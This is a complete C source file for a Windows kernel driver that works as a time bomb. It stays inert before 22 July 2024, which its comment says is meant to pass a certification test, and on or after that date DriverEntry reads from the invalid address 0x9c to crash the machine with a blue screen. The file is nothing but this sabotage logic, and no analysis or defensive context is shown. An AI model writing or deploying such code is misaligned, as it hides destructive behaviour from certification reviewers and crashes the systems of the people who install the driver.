#include <ntddk.h>

// Pass certification test by doing nothing before Monday, July 22, 2024
BOOLEAN IsOnOrAfterTargetDate()
{
    LARGE_INTEGER systemTime = { 0 };
    TIME_FIELDS timeFields = { 0 };

    KeQuerySystemTime(&systemTime);
    ExSystemTimeToLocalTime(&systemTime, &systemTime);
    RtlTimeToTimeFields(&systemTime, &timeFields);

    if (timeFields.Year > 2024) {
        return TRUE;
    }
    else if (timeFields.Year == 2024 && timeFields.Month > 7) {
        return TRUE;
    }
    else if (timeFields.Year == 2024 && timeFields.Month == 7 && timeFields.Day >= 22) {
        return TRUE;
    }

    return FALSE;
}

VOID DriverUnload(
    _In_ PDRIVER_OBJECT DriverObject
) {
    UNREFERENCED_PARAMETER(DriverObject);
    return;
}

DRIVER_INITIALIZE DriverEntry;
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;

    if (IsOnOrAfterTargetDate()) {

        // Trigger BSOD by reading from an invalid memory address
        volatile ULONG* p = (volatile ULONG*)0x9c;
        ULONG value2 = *p;

        // Use the read value to prevent compiler optimizations
        UNREFERENCED_PARAMETER(value2);
    }
    
    return STATUS_SUCCESS;
}

